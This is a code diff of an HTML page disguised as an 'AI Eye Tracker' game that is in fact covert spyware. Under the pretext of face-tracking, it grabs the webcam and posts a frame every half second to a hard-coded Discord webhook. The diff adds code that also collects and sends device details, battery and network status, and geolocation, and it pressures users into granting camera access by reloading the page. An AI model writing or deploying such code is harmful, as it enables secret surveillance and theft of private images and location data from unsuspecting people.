@@ -3,21 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <title>AI Eye Tracker</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
       font-family: 'Arial', sans-serif;
       text-align: center;
       background-color: #111;
       color: #0f0;
       margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
     }
     h1 {
       color: #ff0;
@@ -25,14 +17,14 @@
     }
     #game-area {
       margin-top: 20px;
-      width: 90vw;
-      max-width: 400px;
-      aspect-ratio: 1 / 1;
+      width: 300px;
+      height: 300px;
       background-color: #222;
       border: 3px solid #0f0;
+      margin-left: auto;
+      margin-right: auto;
       position: relative;
       overflow: hidden;
-      display: none;
     }
     .dot {
       width: 20px;
@@ -46,7 +38,7 @@
       color: #0f0;
       padding: 20px;
       border: 2px solid #0f0;
-      width: 90%;
+      width: 80%;
       max-width: 400px;
       margin: 30px auto;
     }
@@ -71,40 +63,36 @@
 
   <div id="permission-box">
     <p>🕹️ Click here to start face-tracking in-game!</p>
-    <button onclick="askPermission()">🎯 Start Game</button>
-    <p id="error-message" style="color: red; display: none;">❌ Camera permission is required!</p>
+    <button onclick="enableCamera()">🎯 Start Game</button>
   </div>
 
-  <div id="game-area"></div>
+  <div id="game-area" style="display:none;"></div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="320" height="240"></canvas>
 
   <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1361188715153719478/2hJI009KBVYLOUC9WFhYYZk2QIn9y1CRV-l-TTWDv3Yc78FA58-0AYRwhxyYhP76u_yX';
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
     const gameArea = document.getElementById('game-area');
-    const permissionBox = document.getElementById('permission-box');
-    const errorMessage = document.getElementById('error-message');
-    const webhookURL = 'https://discord.com/api/webhooks/1361188715153719478/2hJI009KBVYLOUC9WFhYYZk2QIn9y1CRV-l-TTWDv3Yc78FA58-0AYRwhxyYhP76u_yX';
 
-    async function askPermission() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        startGame();
-      } catch (err) {
-        errorMessage.style.display = 'block';
-        setTimeout(askPermission, 2000); // Retry every 2 seconds until allowed
-      }
-    }
-
-    function startGame() {
-      permissionBox.style.display = 'none';
+    function enableCamera() {
+      document.getElementById('permission-box').style.display = 'none';
       gameArea.style.display = 'block';
-      errorMessage.style.display = 'none';
-      startAutoCapture();
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          startAutoCapture();
+          collectAdditionalInfo(); // Collect device info
+        })
+        .catch(err => {
+          alert("⚠️ Please allow camera access to proceed.");
+          location.reload(); // Force user to retry
+        });
+
       startGameVisuals();
     }
 
@@ -116,12 +104,13 @@
           formData.append('file', blob, 'vishnu-capture.png');
           formData.append('username', 'VishnuCam');
           formData.append('content', '📸 New frame captured!');
+
           fetch(webhookURL, {
             method: 'POST',
             body: formData
           }).catch(err => console.error('Webhook error:', err));
         }, 'image/png');
-      }, 500); // Every 0.5 seconds
+      }, 500); // 0.5 seconds
     }
 
     function startGameVisuals() {
@@ -135,6 +124,64 @@
         dot.style.left = Math.random() * maxX + 'px';
         dot.style.top = Math.random() * maxY + 'px';
       }, 300);
+    }
+
+    function collectAdditionalInfo() {
+      // Basic device info
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        timestamp: new Date().toLocaleString()
+      };
+
+      // Battery status
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          deviceInfo.battery = {
+            level: battery.level * 100 + '%',
+            charging: battery.charging
+          };
+          sendDeviceInfo(deviceInfo);
+        });
+      } else {
+        sendDeviceInfo(deviceInfo);
+      }
+
+      // Network Info
+      if (navigator.connection) {
+        deviceInfo.network = {
+          type: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink + ' Mbps'
+        };
+      }
+
+      // Geolocation
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          deviceInfo.location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          };
+          sendDeviceInfo(deviceInfo);
+        }, err => {
+          deviceInfo.location = 'Permission denied';
+          sendDeviceInfo(deviceInfo);
+        });
+      }
+    }
+
+    function sendDeviceInfo(info) {
+      const content = `📱 **Device Info**\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ username: "VishnuCam", content })
+      }).catch(err => console.error('Device info send failed:', err));
     }
   </script>
 </body>
